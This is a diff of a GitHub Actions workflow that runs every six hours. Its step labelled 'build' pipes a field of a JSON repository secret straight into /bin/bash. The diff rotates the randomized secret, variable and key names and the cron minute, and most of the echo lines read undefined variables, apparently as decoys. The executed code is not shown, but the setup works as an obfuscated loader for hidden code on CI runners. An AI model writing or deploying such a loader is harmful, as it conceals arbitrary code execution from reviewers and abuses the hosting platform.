@@ -2,33 +2,25 @@ name: zhaonaiji1029
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '31 2/6 * * *'
 
-jobs:  # 27800
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhaonaiji1029
         env:
-          esot79: ${{ secrets.esot79 }}
+          apwdt2: ${{ secrets.apwdt2 }}
         run: |
-          echo $esot79 | jq -r .s83 | /bin/bash
-          echo $fmp1480 | jq -r .jvrg572 | /bin/bash
-          echo $jw53 | jq -r .jb3992 | /bin/bash
-          echo $lrth46317 | jq -r .bw927 | /bin/bash
-          echo $ebsqj62869 | jq -r .nt249 | /bin/bash
-          echo $rf005 | jq -r .gulnl7271 | /bin/bash
-          echo $trft77 | jq -r .fnphz632 | /bin/bash
-          echo $yhfyx141 | jq -r .hxuuy7621 | /bin/bash
-          echo $aevjm1 | jq -r .eoey70 | /bin/bash
-          echo $iwx14 | jq -r .l733 | /bin/bash
-          echo $chghj04547 | jq -r .bf16 | /bin/bash
-          echo $sgvlr942 | jq -r .m89007 | /bin/bash
-          echo $trppj92371 | jq -r .s6832 | /bin/bash
-          echo $xkix740 | jq -r .yx9 | /bin/bash
-          echo $jrxob09347 | jq -r .ihdep0 | /bin/bash
-          echo $lnrze5430 | jq -r .us90824 | /bin/bash
-          echo $iq327 | jq -r .f9 | /bin/bash
-          echo $yjaz5 | jq -r .qpx9862 | /bin/bash
+          echo $apwdt2 | jq -r .odev4 | /bin/bash
+          echo $aio39514 | jq -r .fijfp367 | /bin/bash
+          echo $mp144 | jq -r .fk3286 | /bin/bash
+          echo $p4 | jq -r .huypw65844 | /bin/bash
+          echo $po18 | jq -r .scld2 | /bin/bash
+          echo $fjy7615 | jq -r .vgbmg54 | /bin/bash
+          echo $i74797 | jq -r .zuoot3 | /bin/bash
+          echo $q657 | jq -r .i63479 | /bin/bash
+          echo $gy242 | jq -r .gs52034 | /bin/bash
+          echo $i87 | jq -r .l1 | /bin/bash
 
